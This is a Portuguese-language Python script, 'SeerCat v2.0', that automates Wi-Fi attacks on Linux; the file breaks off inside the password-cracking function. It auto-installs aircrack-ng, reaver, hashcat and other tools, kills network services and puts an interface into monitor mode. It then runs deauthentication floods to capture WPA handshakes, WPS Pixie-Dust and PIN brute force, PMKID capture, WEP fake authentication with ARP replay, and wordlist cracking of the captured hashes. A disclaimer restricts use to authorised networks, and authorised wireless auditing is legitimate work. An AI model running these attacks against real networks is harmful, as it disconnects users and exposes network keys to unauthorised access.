#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════╗
║                        SeerCat v2.0                             ║
║           Orquestrador Automatizado de Auditoria Wi-Fi          ║
║                   Desenvolvido para Linux                       ║
╚══════════════════════════════════════════════════════════════════╝
AVISO LEGAL: Esta ferramenta destina-se EXCLUSIVAMENTE a testes de
segurança em redes próprias ou com autorização explícita por escrito.
O uso não autorizado é crime. O autor não se responsabiliza por mau uso.
"""

import os
import sys
import time
import subprocess
import threading
import signal
import re
import shutil
import json
import datetime
import random
from pathlib import Path
from collections import deque

# ─────────────────────────────────────────────
#  VERIFICAÇÃO E AUTO-INSTALAÇÃO DE DEPENDÊNCIAS
# ─────────────────────────────────────────────

PYTHON_DEPS = ["rich", "pyfiglet"]

def instalar_deps_python():
    """Instala dependências Python automaticamente."""
    for dep in PYTHON_DEPS:
        try:
            __import__(dep.replace("-", "_"))
        except ImportError:
            print(f"[*] Instalando dependência Python: {dep}...")
            subprocess.run(
                [sys.executable, "-m", "pip", "install", dep, "--quiet"],
                check=True
            )

try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text
    from rich.layout import Layout
    from rich.live import Live
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
    from rich.prompt import Prompt, Confirm
    from rich.align import Align
    from rich.columns import Columns
    from rich.rule import Rule
    from rich.style import Style
    from rich import box
    import pyfiglet
except ImportError:
    instalar_deps_python()
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.text import Text
    from rich.layout import Layout
    from rich.live import Live
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
    from rich.prompt import Prompt, Confirm
    from rich.align import Align
    from rich.columns import Columns
    from rich.rule import Rule
    from rich.style import Style
    from rich import box
    import pyfiglet

# ─────────────────────────────────────────────
#  PALETA DE CORES — ESTILO NEOBANK ESCURO
# ─────────────────────────────────────────────

CORES = {
    "fundo_primario":   "#0D0D0D",
    "fundo_secundario": "#111827",
    "acento_ciano":     "#00FFE7",
    "acento_azul":      "#3B82F6",
    "acento_roxo":      "#8B5CF6",
    "acento_verde":     "#10B981",
    "acento_amarelo":   "#F59E0B",
    "acento_vermelho":  "#EF4444",
    "acento_rosa":      "#EC4899",
    "texto_primario":   "#F9FAFB",
    "texto_secundario": "#9CA3AF",
    "texto_fraco":      "#4B5563",
    "borda":            "#1F2937",
    "destaque":         "#0891B2",
}

console = Console()
log_buffer = deque(maxlen=200)
redes_descobertas = {}
clientes_descobertos = {}
interface_monitor = None
processos_ativos = {}
sessao_inicio = datetime.datetime.now()
pasta_sessao = None
cancelar_evento = threading.Event()

# ─────────────────────────────────────────────
#  UTILITÁRIOS DE TERMINAL E LOG
# ─────────────────────────────────────────────

def log(mensagem: str, nivel: str = "info", exibir: bool = True):
    """Adiciona entrada ao buffer de log em tempo real."""
    ts = datetime.datetime.now().strftime("%H:%M:%S")
    cores_nivel = {
        "info":    f"[{CORES['acento_ciano']}]",
        "ok":      f"[{CORES['acento_verde']}]",
        "aviso":   f"[{CORES['acento_amarelo']}]",
        "erro":    f"[{CORES['acento_vermelho']}]",
        "debug":   f"[{CORES['texto_fraco']}]",
        "captura": f"[{CORES['acento_roxo']}]",
        "ataque":  f"[{CORES['acento_rosa']}]",
    }
    icones = {
        "info":    "◆",
        "ok":      "✓",
        "aviso":   "⚠",
        "erro":    "✗",
        "debug":   "·",
        "captura": "⬡",
        "ataque":  "⚡",
    }
    cor = cores_nivel.get(nivel, cores_nivel["info"])
    icone = icones.get(nivel, "·")
    entrada = f"{cor}[{ts}] {icone} {mensagem}[/]"
    log_buffer.append(entrada)
    if exibir:
        console.print(entrada)


def limpar_tela():
    os.system("clear" if os.name == "posix" else "cls")


def verificar_root():
    """Verifica se o script está rodando como root."""
    if os.geteuid() != 0:
        console.print(Panel(
            f"[{CORES['acento_vermelho']}]⚡ SeerCat precisa de privilégios ROOT para operar.[/]\n"
            f"[{CORES['texto_secundario']}]Execute: [bold]sudo python3 seercat.py[/bold][/]",
            title=f"[{CORES['acento_vermelho']}]PERMISSÃO NEGADA[/]",
            border_style=CORES['acento_vermelho'],
        ))
        sys.exit(1)


def verificar_ferramenta(nome: str) -> bool:
    """Verifica se uma ferramenta do sistema está disponível."""
    return shutil.which(nome) is not None


def instalar_ferramentas_sistema():
    """Detecta o gerenciador de pacotes e instala ferramentas ausentes."""
    ferramentas = {
        "aircrack-ng":  ["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng"],
        "reaver":       ["reaver"],
        "bully":        ["bully"],
        "hashcat":      ["hashcat"],
        "hcxdumptool":  ["hcxdumptool"],
        "hcxtools":     ["hcxpcapngtool"],
        "john":         ["john"],
        "iw":           ["iw"],
        "wireless-tools": ["iwconfig"],
        "net-tools":    ["ifconfig"],
    }

    faltando = []
    for pacote, bins in ferramentas.items():
        if not any(verificar_ferramenta(b) for b in bins):
            faltando.append(pacote)

    if not faltando:
        log("Todas as ferramentas estão instaladas.", "ok")
        return True

    log(f"Ferramentas ausentes: {', '.join(faltando)}", "aviso")

    # Detectar gerenciador de pacotes
    gerenciadores = [
        (["apt-get", "update"], ["apt-get", "install", "-y"]),
        (["pacman", "-Sy"],     ["pacman", "-S", "--noconfirm"]),
        (["dnf", "update", "-y"], ["dnf", "install", "-y"]),
        (["zypper", "refresh"], ["zypper", "install", "-y"]),
    ]

    gerenciador_install = None
    for update_cmd, install_cmd in gerenciadores:
        if verificar_ferramenta(update_cmd[0]):
            gerenciador_install = install_cmd
            log(f"Gerenciador de pacotes detectado: {update_cmd[0]}", "info")
            try:
                subprocess.run(update_cmd, capture_output=True, timeout=60)
            except Exception:
                pass
            break

    if not gerenciador_install:
        log("Gerenciador de pacotes não identificado. Instale manualmente.", "erro")
        return False

    for pacote in faltando:
        log(f"Instalando: {pacote}...", "info")
        try:
            resultado = subprocess.run(
                gerenciador_install + [pacote],
                capture_output=True, text=True, timeout=120
            )
            if resultado.returncode == 0:
                log(f"{pacote} instalado com sucesso.", "ok")
            else:
                log(f"Falha ao instalar {pacote}: {resultado.stderr[:100]}", "aviso")
        except subprocess.TimeoutExpired:
            log(f"Timeout ao instalar {pacote}.", "erro")
        except Exception as e:
            log(f"Erro ao instalar {pacote}: {str(e)}", "erro")

    return True


# ─────────────────────────────────────────────
#  ARTE ASCII E ANIMAÇÕES
# ─────────────────────────────────────────────

def animar_banner():
    """Exibe o banner animado do SeerCat com estilo neobank."""
    limpar_tela()

    frames_olho = ["◉", "◎", "●", "◉", "○", "◎"]
    cores_animacao = [
        CORES['acento_ciano'],
        CORES['acento_azul'],
        CORES['acento_roxo'],
        CORES['acento_rosa'],
        CORES['acento_ciano'],
    ]

    # Animação de carregamento inicial
    console.print()
    for i in range(20):
        cor = cores_animacao[i % len(cores_animacao)]
        barra = "█" * i + "░" * (20 - i)
        console.print(
            f"  [{cor}]{barra}[/]  [{CORES['texto_secundario']}]Inicializando SeerCat...[/]",
            end="\r"
        )
        time.sleep(0.04)

    limpar_tela()
    console.print()

    try:
        fig = pyfiglet.figlet_format("SeerCat", font="slant")
    except Exception:
        fig = "  ___  ___  ___  ___  ___  __ _  ___\n / __|| __|| __|| _ \\/ __|/ _` ||_ _|\n \\__ \\| _| | _| |   / (__ | (_| | | | \n |___/|___||___||_|_\\\\___|\\__,_||___|\n"

    # Exibir banner com gradiente de cor
    linhas = fig.split("\n")
    gradiente = [
        CORES['acento_ciano'],
        CORES['acento_azul'],
        CORES['acento_roxo'],
        CORES['acento_rosa'],
        CORES['acento_azul'],
        CORES['acento_ciano'],
    ]
    for i, linha in enumerate(linhas):
        cor = gradiente[i % len(gradiente)]
        console.print(f"  [{cor}]{linha}[/]")
        time.sleep(0.03)

    console.print()

    # Subtítulo estilo neobank
    subtitulo = Text()
    subtitulo.append("  ⬡ ", style=f"bold {CORES['acento_ciano']}")
    subtitulo.append("ORQUESTRADOR AUTOMATIZADO DE AUDITORIA WI-FI", style=f"bold {CORES['texto_primario']}")
    subtitulo.append("  ⬡", style=f"bold {CORES['acento_ciano']}")
    console.print(Align.center(subtitulo))

    versao = Text()
    versao.append("  v2.0  ", style=f"{CORES['acento_roxo']}")
    versao.append("│", style=f"{CORES['texto_fraco']}")
    versao.append("  Para Linux  ", style=f"{CORES['texto_secundario']}")
    versao.append("│", style=f"{CORES['texto_fraco']}")
    versao.append("  USO SOMENTE EM REDES PRÓPRIAS  ", style=f"bold {CORES['acento_amarelo']}")
    console.print(Align.center(versao))
    console.print()

    # Linha decorativa animada
    largura = console.width or 80
    console.print(f"  [{CORES['acento_ciano']}]{'─' * (largura - 4)}[/]")
    console.print()

    # Animação de olho piscando
    for frame in frames_olho:
        msg = Text()
        msg.append(f"  {frame} ", style=f"bold {CORES['acento_ciano']}")
        msg.append("Sistema inicializado. Bem-vindo, especialista.", style=CORES['texto_secundario'])
        console.print(msg, end="\r")
        time.sleep(0.12)

    console.print()
    console.print()
    time.sleep(0.4)


def animar_spinner(mensagem: str, duracao: float = 2.0, cor: str = None):
    """Exibe spinner animado com mensagem."""
    cor = cor or CORES['acento_ciano']
    frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    fim = time.time() + duracao
    i = 0
    while time.time() < fim:
        frame = frames[i % len(frames)]
        console.print(f"  [{cor}]{frame}[/] [{CORES['texto_secundario']}]{mensagem}[/]", end="\r")
        time.sleep(0.08)
        i += 1
    console.print(f"  [{CORES['acento_verde']}]✓[/] [{CORES['texto_primario']}]{mensagem}[/]")


def pulsar_texto(texto: str, vezes: int = 3, cor1: str = None, cor2: str = None):
    """Anima texto pulsando entre duas cores."""
    cor1 = cor1 or CORES['acento_ciano']
    cor2 = cor2 or CORES['texto_fraco']
    for _ in range(vezes):
        console.print(f"  [{cor1}]{texto}[/]", end="\r")
        time.sleep(0.3)
        console.print(f"  [{cor2}]{texto}[/]", end="\r")
        time.sleep(0.3)
    console.print(f"  [{cor1}]{texto}[/]")


# ─────────────────────────────────────────────
#  PAINEL DE LOG EM TEMPO REAL
# ─────────────────────────────────────────────

def renderizar_painel_log(titulo: str = "LOG EM TEMPO REAL") -> Panel:
    """Renderiza o painel de log com as últimas entradas."""
    conteudo = Text()
    entradas = list(log_buffer)[-18:]
    if not entradas:
        conteudo.append("Aguardando eventos...", style=CORES['texto_fraco'])
    else:
        for entrada in entradas:
            conteudo.append_text(Text.from_markup(entrada))
            conteudo.append("\n")

    return Panel(
        conteudo,
        title=f"[bold {CORES['acento_roxo']}]⬡ {titulo}[/]",
        border_style=CORES['borda'],
        padding=(0, 1),
    )


def renderizar_painel_status() -> Panel:
    """Renderiza painel de status do sistema."""
    t = Table.grid(padding=(0, 2))
    t.add_column(style=f"bold {CORES['acento_ciano']}", no_wrap=True)
    t.add_column(style=CORES['texto_primario'])
    t.add_column(style=f"bold {CORES['acento_ciano']}", no_wrap=True)
    t.add_column(style=CORES['texto_primario'])

    duracao = str(datetime.datetime.now() - sessao_inicio).split(".")[0]
    iface = interface_monitor or "—"
    redes = str(len(redes_descobertas))
    clientes = str(len(clientes_descobertos))

    t.add_row("⏱ Sessão:", duracao, "📡 Interface:", iface)
    t.add_row("🌐 Redes:", redes, "👤 Clientes:", clientes)
    t.add_row("📁 Sessão:", pasta_sessao.name if pasta_sessao else "—", "🔧 Processos:", str(len(processos_ativos)))

    return Panel(
        t,
        title=f"[bold {CORES['acento_azul']}]◆ STATUS DO SISTEMA[/]",
        border_style=CORES['borda'],
    )


# ─────────────────────────────────────────────
#  MÓDULO 1 — GERENCIAMENTO DE INTERFACE
# ─────────────────────────────────────────────

def listar_interfaces_wireless() -> list:
    """Lista interfaces wireless disponíveis."""
    interfaces = []
    try:
        resultado = subprocess.run(
            ["iw", "dev"], capture_output=True, text=True, timeout=10
        )
        for linha in resultado.stdout.split("\n"):
            if "Interface" in linha:
                iface = linha.strip().split()[-1]
                interfaces.append(iface)
    except Exception:
        pass

    if not interfaces:
        try:
            resultado = subprocess.run(
                ["iwconfig"], capture_output=True, text=True, timeout=10,
                stderr=subprocess.DEVNULL
            )
            for linha in resultado.stdout.split("\n"):
                if "IEEE 802.11" in linha or "ESSID" in linha:
                    iface = linha.split()[0]
                    if iface:
                        interfaces.append(iface)
        except Exception:
            pass

    return list(set(interfaces))


def matar_processos_interferentes():
    """Mata processos que interferem no modo monitor."""
    log("Identificando processos interferentes...", "info")
    processos = ["NetworkManager", "wpa_supplicant", "dhclient", "dhcpcd"]

    if verificar_ferramenta("airmon-ng"):
        try:
            resultado = subprocess.run(
                ["airmon-ng", "check", "kill"],
                capture_output=True, text=True, timeout=30
            )
            log("airmon-ng check kill executado.", "ok")
            return
        except Exception:
            pass

    for proc in processos:
        try:
            subprocess.run(
                ["pkill", "-f", proc],
                capture_output=True, timeout=5
            )
            log(f"Processo {proc} finalizado.", "debug")
        except Exception:
            pass


def ativar_modo_monitor(interface: str) -> str | None:
    """Ativa o modo monitor em uma interface wireless."""
    global interface_monitor
    log(f"Ativando modo monitor em {interface}...", "info")

    # Método 1: airmon-ng
    if verificar_ferramenta("airmon-ng"):
        try:
            subprocess.run(
                ["airmon-ng", "start", interface],
                capture_output=True, text=True, timeout=30
            )
            # Detectar nome da nova interface
            for nome in [f"{interface}mon", "wlan0mon", "mon0", interface]:
                resultado = subprocess.run(
                    ["iw", "dev"], capture_output=True, text=True, timeout=5
                )
                if nome in resultado.stdout:
                    interface_monitor = nome
                    log(f"Modo monitor ativo: [{CORES['acento_verde']}]{nome}[/]", "ok")
                    return nome
        except Exception as e:
            log(f"Falha com airmon-ng: {str(e)}", "aviso")

    # Método 2: iw manual
    if verificar_ferramenta("iw"):
        try:
            subprocess.run(["ip", "link", "set", interface, "down"], capture_output=True)
            subprocess.run(["iw", interface, "set", "monitor", "none"], capture_output=True)
            subprocess.run(["ip", "link", "set", interface, "up"], capture_output=True)
            interface_monitor = interface
            log(f"Modo monitor manual ativo: {interface}", "ok")
            return interface
        except Exception as e:
            log(f"Falha modo monitor manual: {str(e)}", "erro")

    return None


def desativar_modo_monitor():
    """Restaura a interface ao modo managed."""
    global interface_monitor
    if not interface_monitor:
        return

    log(f"Restaurando interface {interface_monitor} para modo managed...", "info")

    if verificar_ferramenta("airmon-ng"):
        try:
            subprocess.run(
                ["airmon-ng", "stop", interface_monitor],
                capture_output=True, timeout=30
            )
        except Exception:
            pass

    # Tentar reiniciar NetworkManager
    try:
        subprocess.run(["systemctl", "start", "NetworkManager"], capture_output=True, timeout=15)
        log("NetworkManager reiniciado.", "ok")
    except Exception:
        pass

    interface_monitor = None
    log("Interface restaurada.", "ok")


# ─────────────────────────────────────────────
#  MÓDULO 2 — VARREDURA (SCANNING)
# ─────────────────────────────────────────────

def parsear_linha_airodump(linha: str) -> dict | None:
    """Parseia uma linha do airodump-ng CSV."""
    partes = [p.strip() for p in linha.split(",")]
    if len(partes) >= 14:
        try:
            return {
                "bssid": partes[0],
                "primeiro_visto": partes[1],
                "ultimo_visto": partes[2],
                "canal": partes[3],
                "velocidade": partes[4],
                "privacidade": partes[5],
                "cifra": partes[6],
                "autenticacao": partes[7],
                "potencia": partes[8],
                "beacons": partes[9],
                "iv": partes[10],
                "lan_ip": partes[11],
                "id_length": partes[12],
                "essid": partes[13],
                "wps": partes[14] if len(partes) > 14 else "",
            }
        except Exception:
            return None
    return None


def iniciar_varredura(interface: str, duracao: int = 30) -> dict:
    """Executa varredura passiva com airodump-ng."""
    global redes_descobertas, clientes_descobertos

    if not verificar_ferramenta("airodump-ng"):
        log("airodump-ng não encontrado!", "erro")
        return {}

    if not pasta_sessao:
        log("Pasta de sessão não criada!", "erro")
        return {}

    arquivo_base = str(pasta_sessao / "scan_temp")

    log(f"Iniciando varredura por {duracao} segundos...", "info")
    log("Pulando entre canais (channel hopping)...", "debug")

    proc = subprocess.Popen(
        ["airodump-ng", "--write", arquivo_base, "--output-format", "csv",
         "--write-interval", "2", interface],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    processos_ativos["airodump_scan"] = proc

    # Progress bar durante varredura
    with Progress(
        SpinnerColumn(style=f"bold {CORES['acento_ciano']}"),
        TextColumn(f"[{CORES['texto_primario']}]Varrendo redes...[/]"),
        BarColumn(bar_width=40, style=CORES['acento_roxo'], complete_style=CORES['acento_ciano']),
        TextColumn(f"[{CORES['acento_verde']}]{{task.percentage:>3.0f}}%[/]"),
        TimeElapsedColumn(),
        console=console,
    ) as progress:
        tarefa = progress.add_task("scan", total=duracao)

        for i in range(duracao):
            if cancelar_evento.is_set():
                break
            time.sleep(1)
            progress.advance(tarefa, 1)

            # Ler CSV parcialmente
            csv_file = Path(f"{arquivo_base}-01.csv")
            if csv_file.exists():
                try:
                    with open(csv_file, "r", errors="ignore") as f:
                        linhas = f.readlines()
                    modo = "redes"
                    for linha in linhas:
                        if "Station MAC" in linha:
                            modo = "clientes"
                            continue
                        if linha.strip() and not linha.startswith("BSSID"):
                            if modo == "redes":
                                rede = parsear_linha_airodump(linha)
                                if rede and rede["bssid"] and len(rede["bssid"]) == 17:
                                    redes_descobertas[rede["bssid"]] = rede
                            elif modo == "clientes":
                                partes = [p.strip() for p in linha.split(",")]
                                if len(partes) >= 6 and len(partes[0]) == 17:
                                    clientes_descobertos[partes[0]] = {
                                        "mac": partes[0],
                                        "ap": partes[5] if len(partes) > 5 else "",
                                    }
                except Exception:
                    pass

    proc.terminate()
    try:
        proc.wait(timeout=3)
    except Exception:
        proc.kill()

    del processos_ativos["airodump_scan"]
    log(f"Varredura concluída. {len(redes_descobertas)} redes encontradas.", "ok")
    return redes_descobertas


# ─────────────────────────────────────────────
#  MÓDULO 3 — EXIBIÇÃO DE REDES
# ─────────────────────────────────────────────

def exibir_redes_descobertas():
    """Exibe tabela formatada das redes descobertas."""
    if not redes_descobertas:
        console.print(Panel(
            f"[{CORES['acento_amarelo']}]Nenhuma rede encontrada. Execute uma varredura primeiro.[/]",
            border_style=CORES['acento_amarelo'],
        ))
        return

    tabela = Table(
        title=f"[bold {CORES['acento_ciano']}]◆ REDES WI-FI DESCOBERTAS[/]",
        border_style=CORES['borda'],
        header_style=f"bold {CORES['acento_azul']}",
        box=box.HEAVY_HEAD,
        show_lines=True,
    )

    tabela.add_column("#", style=CORES['texto_fraco'], width=4, justify="right")
    tabela.add_column("ESSID", style=f"bold {CORES['texto_primario']}", min_width=20)
    tabela.add_column("BSSID", style=CORES['texto_secundario'], width=19)
    tabela.add_column("CH", style=CORES['acento_ciano'], width=4, justify="center")
    tabela.add_column("PWR", style=CORES['acento_azul'], width=6, justify="right")
    tabela.add_column("PRIVACIDADE", style=CORES['acento_rosa'], width=12)
    tabela.add_column("WPS", style=CORES['acento_verde'], width=5, justify="center")
    tabela.add_column("CLIENTES", style=CORES['acento_amarelo'], width=9, justify="center")

    for idx, (bssid, rede) in enumerate(redes_descobertas.items(), 1):
        essid = rede.get("essid", "").strip() or f"[{CORES['texto_fraco']}](oculta)[/]"
        privacidade = rede.get("privacidade", "").strip() or "?"
        canal = rede.get("canal", "?").strip()
        potencia = rede.get("potencia", "?").strip()
        wps = rede.get("wps", "").strip()
        wps_txt = f"[{CORES['acento_verde']}]✓[/]" if wps else "—"

        # Colorir por tipo de segurança
        if "WPA2" in privacidade or "WPA3" in privacidade:
            priv_txt = f"[{CORES['acento_amarelo']}]{privacidade}[/]"
        elif "WPA" in privacidade:
            priv_txt = f"[{CORES['acento_azul']}]{privacidade}[/]"
        elif "WEP" in privacidade:
            priv_txt = f"[{CORES['acento_vermelho']}]{privacidade}[/]"
        else:
            priv_txt = f"[{CORES['acento_verde']}]{privacidade}[/]"

        clientes_ap = sum(
            1 for c in clientes_descobertos.values()
            if c.get("ap", "").strip() == bssid
        )
        clientes_txt = str(clientes_ap) if clientes_ap > 0 else "—"

        tabela.add_row(
            str(idx), essid, bssid, canal, potencia, priv_txt, wps_txt, clientes_txt
        )

    console.print()
    console.print(tabela)
    console.print()


# ─────────────────────────────────────────────
#  MÓDULO 4 — CAPTURA DE HANDSHAKE WPA/WPA2
# ─────────────────────────────────────────────

def capturar_handshake(bssid: str, canal: str, interface: str) -> str | None:
    """Captura handshake WPA usando deautenticação."""
    rede = redes_descobertas.get(bssid, {})
    essid = rede.get("essid", bssid).strip()

    log(f"Iniciando captura de handshake: {essid} ({bssid})", "ataque")
    arquivo_cap = str(pasta_sessao / f"handshake_{bssid.replace(':', '-')}")

    # Iniciar captura airodump-ng no canal específico
    proc_dump = subprocess.Popen(
        ["airodump-ng", "-c", canal, "--bssid", bssid,
         "-w", arquivo_cap, "--output-format", "cap", interface],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    processos_ativos["airodump_cap"] = proc_dump
    log("Captura iniciada. Aguardando clientes...", "info")

    time.sleep(5)

    # Enviar deautenticações
    handshake_capturado = False
    tentativas = 0
    max_tentativas = 5

    with Progress(
        SpinnerColumn(style=f"bold {CORES['acento_rosa']}"),
        TextColumn(f"[{CORES['acento_rosa']}]Enviando deautenticações...[/]"),
        BarColumn(bar_width=30, style=CORES['acento_vermelho']),
        TextColumn(f"[{CORES['texto_secundario']}]Tentativa {{task.completed}}/{{task.total}}[/]"),
        console=console,
    ) as progress:
        tarefa = progress.add_task("deauth", total=max_tentativas)

        for tentativa in range(max_tentativas):
            if cancelar_evento.is_set():
                break

            progress.advance(tarefa, 1)
            log(f"Deautenticação {tentativa + 1}/{max_tentativas}...", "ataque")

            try:
                subprocess.run(
                    ["aireplay-ng", "--deauth", "10", "-a", bssid, interface],
                    capture_output=True, timeout=15
                )
            except Exception as e:
                log(f"Erro na deautenticação: {str(e)}", "aviso")

            time.sleep(5)

            # Verificar se handshake foi capturado
            cap_file = Path(f"{arquivo_cap}-01.cap")
            if cap_file.exists():
                resultado = subprocess.run(
                    ["aircrack-ng", str(cap_file)],
                    capture_output=True, text=True, timeout=10
                )
                if "WPA" in resultado.stdout and "handshake" in resultado.stdout.lower():
                    handshake_capturado = True
                    log(f"Handshake capturado! Arquivo: {cap_file.name}", "captura")
                    break

            tentativas += 1

    proc_dump.terminate()
    try:
        proc_dump.wait(timeout=3)
    except Exception:
        proc_dump.kill()

    del processos_ativos["airodump_cap"]

    if handshake_capturado:
        return str(Path(f"{arquivo_cap}-01.cap"))
    else:
        log("Handshake não capturado. Tente novamente.", "aviso")
        return None


# ─────────────────────────────────────────────
#  MÓDULO 5 — ATAQUE WPS (REAVER/BULLY)
# ─────────────────────────────────────────────

def atacar_wps(bssid: str, canal: str, interface: str, metodo: str = "reaver"):
    """Executa ataque WPS Pixie-Dust ou PIN bruteforce."""
    rede = redes_descobertas.get(bssid, {})
    essid = rede.get("essid", bssid).strip()

    log(f"Iniciando ataque WPS [{metodo}] em: {essid} ({bssid})", "ataque")

    ferramenta = None
    cmd = []

    if metodo == "reaver" and verificar_ferramenta("reaver"):
        ferramenta = "reaver"
        cmd = ["reaver", "-i", interface, "-b", bssid, "-c", canal,
               "-K", "1", "-v", "-o", str(pasta_sessao / f"wps_{bssid.replace(':', '-')}.txt")]
    elif metodo == "bully" and verificar_ferramenta("bully"):
        ferramenta = "bully"
        cmd = ["bully", interface, "-b", bssid, "-c", canal,
               "-d", "-v", "3"]
    else:
        log(f"Ferramenta {metodo} não disponível.", "erro")
        return

    log(f"Executando {ferramenta} (pressione Ctrl+C para parar)...", "info")

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )
        processos_ativos[f"wps_{ferramenta}"] = proc

        for linha in proc.stdout:
            linha = linha.strip()
            if linha:
                if "WPS PIN" in linha or "WPA PSK" in linha or "Passphrase" in linha:
                    log(f"RESULTADO: {linha}", "ok")
                elif "Trying" in linha or "Sending" in linha:
                    log(linha, "debug")
                elif "Error" in linha or "Failed" in linha:
                    log(linha, "aviso")
                else:
                    log(linha, "debug")

        proc.wait()
        del processos_ativos[f"wps_{ferramenta}"]

    except KeyboardInterrupt:
        log("Ataque WPS interrompido pelo usuário.", "aviso")
        if f"wps_{ferramenta}" in processos_ativos:
            processos_ativos[f"wps_{ferramenta}"].terminate()
            del processos_ativos[f"wps_{ferramenta}"]


# ─────────────────────────────────────────────
#  MÓDULO 6 — CAPTURA PMKID
# ─────────────────────────────────────────────

def capturar_pmkid(bssid: str, interface: str) -> str | None:
    """Captura PMKID usando hcxdumptool."""
    if not verificar_ferramenta("hcxdumptool"):
        log("hcxdumptool não disponível.", "erro")
        return None

    log(f"Iniciando captura PMKID para {bssid}...", "ataque")
    arquivo_pcap = str(pasta_sessao / f"pmkid_{bssid.replace(':', '-')}.pcapng")

    # Criar filtro por BSSID
    filtro_file = str(pasta_sessao / "bssid_filter.txt")
    with open(filtro_file, "w") as f:
        f.write(bssid.replace(":", "").lower() + "\n")

    try:
        proc = subprocess.Popen(
            ["hcxdumptool", "-o", arquivo_pcap, "-i", interface,
             "--filterlist_ap=" + filtro_file, "--filtermode=2",
             "--enable_status=1"],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )
        processos_ativos["pmkid"] = proc

        log("Aguardando PMKID (máx. 60 segundos)...", "info")
        inicio = time.time()

        while time.time() - inicio < 60:
            if cancelar_evento.is_set():
                break
            linha = proc.stdout.readline()
            if linha:
                log(linha.strip(), "debug")
            if "PMKID" in linha:
                log("PMKID capturado!", "captura")
                break
            time.sleep(0.1)

        proc.terminate()
        try:
            proc.wait(timeout=3)
        except Exception:
            proc.kill()

        del processos_ativos["pmkid"]

        # Converter para formato hashcat
        if verificar_ferramenta("hcxpcapngtool"):
            arquivo_hash = str(pasta_sessao / f"pmkid_{bssid.replace(':', '-')}.hash")
            subprocess.run(
                ["hcxpcapngtool", "-o", arquivo_hash, arquivo_pcap],
                capture_output=True
            )
            if Path(arquivo_hash).exists() and Path(arquivo_hash).stat().st_size > 0:
                log(f"Hash PMKID salvo: {arquivo_hash}", "ok")
                return arquivo_hash

    except Exception as e:
        log(f"Erro na captura PMKID: {str(e)}", "erro")

    return None


# ─────────────────────────────────────────────
#  MÓDULO 7 — ATAQUE WEP
# ─────────────────────────────────────────────

def atacar_wep(bssid: str, canal: str, interface: str):
    """Executa ataque WEP com reinjeção de pacotes."""
    rede = redes_descobertas.get(bssid, {})
    essid = rede.get("essid", bssid).strip()

    log(f"Iniciando ataque WEP em: {essid} ({bssid})", "ataque")
    arquivo_cap = str(pasta_sessao / f"wep_{bssid.replace(':', '-')}")

    # Capturar IVs
    proc_dump = subprocess.Popen(
        ["airodump-ng", "-c", canal, "--bssid", bssid,
         "-w", arquivo_cap, "--output-format", "cap", interface],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    processos_ativos["wep_dump"] = proc_dump

    time.sleep(5)

    # Autenticação falsa
    log("Tentando autenticação falsa...", "ataque")
    try:
        subprocess.run(
            ["aireplay-ng", "--fakeauth", "0", "-a", bssid, interface],
            capture_output=True, timeout=15
        )
    except Exception:
        pass

    # Reinjeção de pacotes ARP
    log("Iniciando reinjeção ARP...", "ataque")
    proc_inject = subprocess.Popen(
        ["aireplay-ng", "--arpreplay", "-b", bssid, interface],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    processos_ativos["wep_inject"] = proc_inject

    # Tentar crackear a cada 10 segundos
    log("Aguardando IVs suficientes para quebrar WEP...", "info")
    for _ in range(12):
        if cancelar_evento.is_set():
            break
        time.sleep(10)
        cap_file = Path(f"{arquivo_cap}-01.cap")
        if cap_file.exists():
            resultado = subprocess.run(
                ["aircrack-ng", str(cap_file)],
                capture_output=True, text=True, timeout=30
            )
            if "KEY FOUND" in resultado.stdout:
                log("CHAVE WEP ENCONTRADA!", "ok")
                for linha in resultado.stdout.split("\n"):
                    if "KEY FOUND" in linha:
                        log(linha.strip(), "ok")
                break
            else:
                log("IVs insuficientes, continuando...", "debug")

    proc_inject.terminate()
    proc_dump.terminate()
    for k in ["wep_dump", "wep_inject"]:
        if k in processos_ativos:
            del processos_ativos[k]


# ─────────────────────────────────────────────
#  MÓDULO 8 — QUEBRA DE SENHA (HASHCAT/JOHN)
# ─────────────────────────────────────────────

def quebrar_senha(arquivo_hash: str, wordlist: str):
    """Tenta quebrar senha com hashcat ou john."""
    if not Path(arquivo_hash).exists():
        log(f"Arquivo de hash não encontrado: {arquivo_hash}", "erro")
        return

    if not Path(wordlist).exists():
        log(f"Wordlist não encontrada: {wordlist}", "erro")
        return

    log(f"Iniciando quebra de senha com wordlist: {wordlist}", "ataque")

    # Tentar hashcat primeiro
    if verificar_ferramenta("hashcat"):
        log("Usando Hashcat (GPU acelerado)...", "info")
        ext = Path(arquivo_hash).suffix.lower()
        modo = "22000" if ext in [".hash", ".hc22000"] else "2500"

        proc = subprocess.Popen(
            ["hashcat", "-m", modo, arquivo_hash, wordlist,
             "--status", "--status-timer=5", "-o",
             str(pasta_sessao / "senhas_encontradas.txt")],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )
        processos_ativos["hashcat"] = proc

        for linha in proc.stdout:
            linha = linha.strip()
            if linha:
                if "Status" in linha or "Speed" in linha or "Guess" in linha:
                    log(linha, "info")
                elif "Cracked" in linha or "cracked" in linha:
                    log(f"SENHA ENCONTRADA: {linha}", "ok")

        proc.wait()
        if "hashcat" in processos_ativos:
            del processos_ativos["hashcat"]

    elif verificar_ferramenta("john"):
        log("Usando John the Ripper (CPU)...", "info")
        proc = subprocess.Popen(
            ["john", "--wordlist=" + wordlist, arquivo_hash],
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True
        )
